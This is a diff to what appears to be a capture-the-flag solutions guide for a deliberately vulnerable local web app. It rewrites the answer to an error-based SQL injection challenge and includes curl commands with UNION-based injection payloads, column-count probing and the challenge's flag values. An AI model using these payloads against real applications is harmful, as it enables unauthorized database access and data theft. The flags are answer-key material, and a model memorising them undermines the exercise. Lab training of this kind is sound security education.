@@ -87,14 +87,29 @@ Flag: FLAG{st4ck3d_qu3ry_h4ck}
 CHALLENGE 6: Error-Based SQL Injection (API)
 Flag: FLAG{3rr0r_b4s3d_l34k}
 
-  The /api/posts endpoint returns errors as JSON:
+  The /api/posts endpoint returns detailed error messages as JSON,
+  including the full query text:
     SELECT * FROM posts WHERE category = '{category}'
 
-  Force an error that leaks data via CAST:
+  Step 1: Use error messages to discover the column count:
+  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,2,3--"
+  Error: "SELECTs to the left and right of UNION do not have the same
+  number of result columns" (tells you 3 is wrong)
 
-  curl "http://localhost:5001/api/posts?category=' AND 1=CAST((SELECT flag_value FROM flags WHERE flag_name='api_flag') AS INT)--"
+  Step 2: Find correct column count (6 columns):
+  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,2,3,4,5,6--"
+  (succeeds — no error)
 
-  The error message contains the flag value because SQLite tries
-  to cast the flag string as an integer and includes it in the error.
+  Step 3: Extract the flag via UNION:
+  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,'api_flag',flag_value,4,5,6+FROM+flags+WHERE+flag_name%3D'api_flag'--"
+
+  The key difference from Challenge 1 is that this endpoint returns
+  JSON with structured error messages — useful for column discovery
+  and debugging injection payloads. In MySQL/MSSQL, CAST/CONVERT-based
+  errors can leak data directly; SQLite is more limited.
+
+  NOTE: SQLite doesn't produce CAST errors that embed data (it silently
+  converts), so the primary technique here is using the error feedback
+  to refine a UNION-based extraction.
 
 ===============================================================================
